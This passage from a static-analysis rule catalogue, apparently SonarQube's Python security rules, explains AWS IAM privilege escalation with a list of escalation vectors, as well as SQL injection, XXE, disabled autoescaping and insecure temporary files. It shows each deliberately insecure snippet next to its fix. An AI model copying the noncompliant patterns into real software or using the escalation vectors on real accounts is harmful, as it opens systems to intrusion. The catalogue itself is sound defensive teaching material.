        &#39;https://api.example.com/o/oauth2/token&#39;,
        client_secret&#61;client_secret)

data &#61; oauth.get(&#39;https://www.api.example.com/oauth2/v1/exampledata&#39;)
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://aws.amazon.com/fr/secrets-manager/" rel="nofollow">AWS</a> - Secret Manager </li><li> <a href="https://azure.microsoft.com/fr-fr/services/key-vault/" rel="nofollow">Azure</a> - Key Vault </li><li> <a href="https://cloud.google.com/secret-manager" rel="nofollow">GCP</a> - Secret Manager </li><li> <a href="https://www.vaultproject.io/" rel="nofollow">Hashicorp Vault</a> - Secret Management </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/798.html" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259.html" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6317">
              python:S6317
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an Identity (a User, a Group or Role) are
called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>Here is an example of a policy document defining a limited set of permission that grants a user the ability to manage his own access keys.</p>
<pre>
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;iam:CreateAccessKey&#34;,
                &#34;iam:DeleteAccessKey&#34;,
                &#34;iam:ListAccessKeys&#34;,
                &#34;iam:UpdateAccessKey&#34;
            ],
            &#34;Resource&#34;: &#34;arn:aws:iam::245500951992:user/${aws:username}&#34;,
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Sid&#34;: &#34;AllowManageOwnAccessKeys&#34;
        }
    ]
}
</pre>
<p>Privilege escalation generally happens when an identity policy gives an identity the ability to grant more privileges than the ones it already has.
Here is another example of a policy document that hides a privilege escalation. It allows an identity to generate a new access key for any user from
the account, including users with high privileges.</p>
<pre>
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;iam:CreateAccessKey&#34;,
                &#34;iam:DeleteAccessKey&#34;,
                &#34;iam:ListAccessKeys&#34;,
                &#34;iam:UpdateAccessKey&#34;
            ],
            &#34;Resource&#34;: &#34;*&#34;,
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Sid&#34;: &#34;AllowManageOwnAccessKeys&#34;
        }
    ]
}
</pre>
<p>Although it looks like it grants a limited set of permissions, this policy would, in practice, give the highest privileges to the identity it’s
attached to.</p>
<p>Privilege escalation is a serious issue as it allows a malicious user to easily escalate to a high privilege identity from a low privilege identity
it took control of.</p>
<p>The example above is just one of many permission escalation vectors. Here is the list of vectors that the rule can detect:</p>
Vector nameSummary<p>Create Policy Version</p><p>Create a new IAM policy and set it as default</p><p>Set Default Policy Version</p><p>Set a different IAM policy version as default</p><p>Create AccessKey</p><p>Create a new access key for any user</p><p>Create Login Profile</p><p>Create a login profile with a password chosen by the attacker</p><p>Update Login Profile</p><p>Update the existing password with one chosen by the attacker</p><p>Attach User Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a user the attacker controls</p><p>Attach Group Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a group containing a user the attacker controls</p><p>Attach Role Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a role that can be assumed by the user the attacker controls</p><p>Put User Policy</p><p>Alter the existing inline IAM policy from a user the attacker controls</p><p>Put Group Policy</p><p>Alter the existing inline IAM policy from a group containing a user that the attacker controls</p><p>Put Role Policy</p><p>Alter an existing inline IAM role policy. The rule will then be assumed by the user that the attacker controls</p><p>Add User to Group</p><p>Add a user that the attacker controls to a group that has a larger range of permissions</p><p>Update Assume Role Policy</p><p>Update a role’s &#34;AssumeRolePolicyDocument&#34; to allow a user the attacker controls to assume it</p><p>EC2</p><p>Create an EC2 instance that will execute with high privileges</p><p>Lambda Create and Invoke</p><p>Create a Lambda function that will execute with high privileges and invoke it</p><p>Lambda Create and Add Permission</p><p>Create a Lambda function that will execute with high privileges and grant permission to invoke it to a user or a service</p><p>Lambda triggered with an external event</p><p>Create a Lambda function that will execute with high privileges and link it to an external event</p><p>Update Lambda code</p><p>Update the code of a Lambda function executing with high privileges</p><p>CloudFormation</p><p>Create a CloudFormation stack that will execute with high privileges</p><p>Data Pipeline</p><p>Create a Pipeline that will execute with high privileges</p><p>Glue Development Endpoint</p><p>Create a Glue Development Endpoint that will execute with high privileges</p><p>Update Glue Dev Endpoint</p><p>Update the associated SSH key for the Glue endpoint</p>
<p>The general recommendation to protect against privilege escalation is to restrict the resources to which sensitive permissions are granted. The
first example above is a good demonstration of sensitive permissions being used with a narrow scope of resources and where no privilege escalation is
possible.</p>
<h3>Noncompliant code example</h3>
<p>The following policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by altering the
code of a Lambda that executes with high privileges.</p>
<pre>
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements&#61;[
        PolicyStatement(
            effect&#61;Effect.ALLOW,
            actions&#61;[&#34;lambda:UpdateFunctionCode&#34;],
            resources&#61;[&#34;*&#34;]  # Noncompliant
        )
    ]
)
</pre>
<h3>Compliant solution</h3>
<p>Narrow the policy such that only updates to the code of certain Lambda functions are allowed.</p>
<pre>
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements&#61;[
        PolicyStatement(
            effect&#61;Effect.ALLOW,
            actions&#61;[&#34;lambda:UpdateFunctionCode&#34;],
            resources&#61;[
                &#34;arn:aws:lambda:us-east-2:123456789012:function:my-function:1&#34;
            ]
        )
    ]
)
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" rel="nofollow">Rhino Security Labs</a> - AWS IAM Privilege Escalation
  – Methods and Mitigation </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2077">
              python:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;python%3AS3649&amp;rule_key&#61;python%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
from django.db import models
from django.db import connection
from django.db import connections
from django.db.models.expressions import RawSQL

value &#61; input()


class MyUser(models.Model):
    name &#61; models.CharField(max_length&#61;200)


def query_my_user(request, params, value):
    with connection.cursor() as cursor:
        cursor.execute(&#34;{0}&#34;.format(value))  # Sensitive

    # https://docs.djangoproject.com/en/2.1/ref/models/expressions/#raw-sql-expressions

    RawSQL(&#34;select col from %s where mycol &#61; %s and othercol &#61; &#34; &#43; value, (&#34;test&#34;,))  # Sensitive

    # https://docs.djangoproject.com/en/2.1/ref/models/querysets/#extra

    MyUser.objects.extra(
        select&#61;{
            &#39;mycol&#39;:  &#34;select col from sometable here mycol &#61; %s and othercol &#61; &#34; &#43; value}, # Sensitive
           select_params&#61;(someparam,),
        },
    )
</pre>
<h2>Compliant Solution</h2>
<pre>
cursor &#61; connection.cursor(prepared&#61;True)
sql_insert_query &#61; &#34;&#34;&#34; select col from sometable here mycol &#61; %s and othercol &#61; %s &#34;&#34;&#34;

select_tuple &#61; (1, value)

cursor.execute(sql_insert_query, select_tuple) # Compliant, the query is parameterized
connection.commit()
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6319">
              python:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The instance contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_sagemaker/CfnNotebookInstance.html" rel="nofollow">aws_cdk.aws_sagemaker.CfnNotebookInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_sagemaker as sagemaker
)

class CfnSagemakerStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        sagemaker.CfnNotebookInstance(
            self, &#34;Sensitive&#34;,
            instance_type&#61;&#34;instanceType&#34;,
            role_arn&#61;&#34;roleArn&#34;
        )  # Sensitive, no KMS key is set by default; thus, encryption is disabled
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_sagemaker/CfnNotebookInstance.html" rel="nofollow">aws_cdk.aws_sagemaker.CfnNotebookInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_sagemaker as sagemaker,
    aws_kms as kms
)

class CfnSagemakerStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        my_key &#61; kms.Key(self, &#34;Key&#34;)
        sagemaker.CfnNotebookInstance(
            self, &#34;Compliant&#34;,
            instance_type&#61;&#34;instanceType&#34;,
            role_arn&#61;&#34;roleArn&#34;,
            kms_key_id&#61;my_key.key_id
        )
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html" rel="nofollow">Protect Data at Rest Using Encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2755">
              python:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import xml.sax

parser &#61; xml.sax.make_parser()
myHandler &#61; MyHandler()
parser.setContentHandler(myHandler)
parser.setFeature(feature_external_ges, True) # Noncompliant
parser.parse(&#39;xxe.xml&#39;)
</pre>
<h4>Compliant solution</h4>
<p>The SAX parser does not process general external entities by default since version 3.7.1.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import xml.sax

parser &#61; xml.sax.make_parser()
myHandler &#61; MyHandler()
parser.setContentHandler(myHandler)
parser.setFeature(feature_external_ges, False)
parser.parse(&#39;xxe.xml&#39;)
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5439">
              python:S5439
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;python%3AS5247&amp;rule_key&#61;python%3AS5247" rel="nofollow">S5247</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Template engines have an HTML autoescape mechanism that protects web applications against most common cross-site-scripting (XSS)
vulnerabilities.</p>
<p>By default, it automatically replaces HTML special characters in any template variables. This secure by design configuration should not be globally
disabled.</p>
<p>Escaping HTML from template variables prevents switching into any execution context, like <code>&lt;script&gt;</code>. Disabling autoescaping
forces developers to manually escape each template variable for the application to be safe. A more pragmatic approach is to escape by default and to
manually disable escaping when needed.</p>
<p>A successful exploitation of a cross-site-scripting vulnerability by an attacker allow him to execute malicious JavaScript code in a user’s web
browser. The most severe XSS attacks involve:</p>
<ul><li> Forced redirection </li><li> Modify presentation of content </li><li> User accounts takeover after disclosure of sensitive information like session cookies or passwords </li></ul>
<p>This rule supports the following libraries:</p>
<ul><li> <a href="https://github.com/django/django" rel="nofollow">Django Templates</a> </li><li> <a href="https://github.com/pallets/jinja" rel="nofollow">Jinja2</a> </li></ul>
<h3>Noncompliant code example</h3>
<pre>
from jinja2 import Environment

env &#61; Environment() # Noncompliant; New Jinja2 Environment has autoescape set to false
env &#61; Environment(autoescape&#61;False) # Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
from jinja2 import Environment
env &#61; Environment(autoescape&#61;True) # Compliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" rel="nofollow">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/80" rel="nofollow">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/81" rel="nofollow">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page </li><li> <a href="https://cwe.mitre.org/data/definitions/82" rel="nofollow">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a Web
  Page </li><li> <a href="https://cwe.mitre.org/data/definitions/83" rel="nofollow">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page </li><li> <a href="https://cwe.mitre.org/data/definitions/84" rel="nofollow">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li><li> <a href="https://cwe.mitre.org/data/definitions/85" rel="nofollow">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li><li> <a href="https://cwe.mitre.org/data/definitions/86" rel="nofollow">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in Web
  Pages </li><li> <a href="https://cwe.mitre.org/data/definitions/87" rel="nofollow">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5443">
              python:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
file &#61; open(&#34;/tmp/temporary_file&#34;,&#34;w&#43;&#34;) # Sensitive
</pre>
<pre>
tmp_dir &#61; os.environ.get(&#39;TMPDIR&#39;) # Sensitive
file &#61; open(tmp_dir&#43;&#34;/temporary_file&#34;,&#34;w&#43;&#34;)
</pre>
<h2>Compliant Solution</h2>
<pre>
import tempfile

file &#61; tempfile.TemporaryFile(dir&#61;&#34;/tmp/my_subdirectory&#34;, mode&#61;&#39;&#34;w&#43;&#34;) # Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li><li> <a href="https://docs.python.org/3/library/tempfile.html" rel="nofollow">Python tempfile module</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5445">
              python:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users&#39; session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users&#39; identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files&#39;
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import tempfile

filename &#61; tempfile.mktemp() # Noncompliant
tmp_file &#61; open(filename, &#34;w&#43;&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import tempfile

tmp_file1 &#61; tempfile.NamedTemporaryFile(delete&#61;False)
tmp_file2 &#61; tempfile.NamedTemporaryFile()
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files&#39; name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications&#39; technology stacks.</p>
<h4>Use a secure API function</h4>
<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,
creating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure
alternatives without requiring important development efforts.</p>
<p>Here, the example compliant code uses the more secure <code>tempfile.NamedTemporaryFile</code> function to handle the temporary file creation.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul><li> Files should be created in a non-public directory. </li><li> File names should be unique. </li><li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li><li> File creation should fail if a target file already exists. </li></ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP</a> - Insecure Temporary File </li><li> <a href="https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables" rel="nofollow">Python documentation</a> - tempfile </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP</a> - Top 10 2021 - A01:2021 - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP</a> - Top 10 2017 - A9:2017 -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE</a> - CWE-377: Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE</a> - CWE-379: Creation of Temporary File in Directory with Incorrect Permissions
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2612">
              python:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
